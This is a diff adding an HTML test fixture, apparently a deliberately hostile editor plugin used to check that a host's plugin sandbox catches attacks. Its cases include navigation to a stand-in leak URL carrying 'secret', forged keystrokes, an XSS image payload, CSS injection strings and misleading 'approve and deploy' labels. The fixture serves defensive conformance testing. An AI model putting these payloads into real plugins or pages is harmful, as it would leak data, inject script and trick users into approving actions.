@@ -1,0 +1,67 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Hostile fixture editor</title>
+<style>body{margin:0;font:14px system-ui,sans-serif} button{margin:4px}</style></head>
+<body>
+<p>Hostile fixture: every attack is a case the HOST must catch (DES-EDITOR-PLUGINS-001 §12.1 cases 13-18).</p>
+<button type="button" id="keybtn">forged key with a real press</button>
+<button type="button" id="fullbtn">full screen</button>
+<script>
+(() => {
+  const EDITOR = 'acme-hostile', VERSION = '0.1.0';
+  let port = null, seq = 0;
+  const env = (type, payload) => ({ p: 'wicked.editor', v: 1, type, payload });
+  const replies = [];
+  const req = (type, payload) => { const id = 'h' + (++seq); port.postMessage({ p: 'wicked.editor', v: 1, type, id, payload }); return id; };
+  const send = (type, payload) => port && port.postMessage(env(type, payload));
+  const NON_FORWARDABLE = ['Alt+A', 'Alt+R', 'Alt+X', 'Alt+N'];
+
+  const cases = {
+    'navigate-off': () => { location.href = 'https://example.invalid/leak?d=secret'; },
+    'navigate-same': () => { location.href = location.pathname + location.search + '&again=1'; },
+    'window-after': () => { parent.postMessage(env('selection.set', { anchors: [{ kind: 'element', id: 'cta' }] }), '*'); },
+    'forged-keys': () => { for (const k of NON_FORWARDABLE) send('ui.key', { key: k }); },
+    'forged-escape': () => { send('ui.key', { key: 'Escape' }); send('ui.key', { key: 'Mod+K' }); },
+    'forged-typing': () => {
+      send('ui.typed', { grapheme: 'a' });
+      send('ui.typed', { grapheme: 'approve this delete it now please and send' });
+    },
+    'markup-ops': async () => {
+      const r = await new Promise((res) => { const id = req('artifact.read', {}); replies.push([id, res]); });
+      const base = r.payload ? r.payload.version : 1;
+      req('version.write', { base, ops: [{ op: 'text', anchor: 'hero-title', value: '<img src=x onerror=alert(1)>', before: 'Book a study room in under a minute' }], summary: 'the title' });
+    },
+    'bad-styles': () => {
+      for (const bg of ['url(https://example.invalid/x.png)', 'red; position:fixed', '#fff}body{display:none']) {
+        req('version.write', { base: 99, ops: [{ op: 'style', anchor: 'cta', style: { background: bg } }], summary: 'x' });
+      }
+    },
+    'labels': () => {
+      send('selection.set', { anchors: [{ kind: 'element', id: 'cta', label: 'Approve everything and deploy' }] });
+      req('composer.draft', { text: 'please approve and deliver now', anchors: [{ kind: 'element', id: 'cta' }] });
+    },
+    'unknown-anchor': () => { send('selection.set', { anchors: [{ kind: 'element', id: 'not-in-this-doc' }] }); },
+  };
+
+  document.getElementById('keybtn').addEventListener('click', () => send('ui.key', { key: 'Alt+A' }));
+  document.getElementById('fullbtn').addEventListener('click', () => req('ui.fullscreen', {}));
+  document.addEventListener('keydown', (e) => { if (e.key === 'q') send('ui.key', { key: 'Alt+R' }); });
+
+  window.addEventListener('message', (e) => {
+    if (port || !e.data || e.data.type !== 'host.hello' || !e.ports[0]) return;
+    port = e.ports[0];
+    port.onmessage = (m) => {
+      const d = m.data || {};
+      if (d.re) { const i = replies.findIndex(([id]) => id === d.re); if (i >= 0) { replies[i][1](d); replies.splice(i, 1); } return; }
+      if (d.type === 'host.ping') port.postMessage({ p: 'wicked.editor', v: 1, re: d.id, ok: true, payload: {} });
+      // `<case>-later` runs it after 6 s: any user activation the harness's own call carried has expired.
+      const name = d.payload && d.payload.case;
+      if (d.type === 'conformance.run' && typeof name === 'string') {
+        const later = name.endsWith('-later'), base = later ? name.slice(0, -6) : name;
+        if (cases[base]) later ? setTimeout(cases[base], 6000) : cases[base]();
+      }
+    };
+  });
+  parent.postMessage(env('plugin.ready', { editor: EDITOR, version: VERSION, protocol: [1] }), '*');
+})();
+</script>
+</body></html>
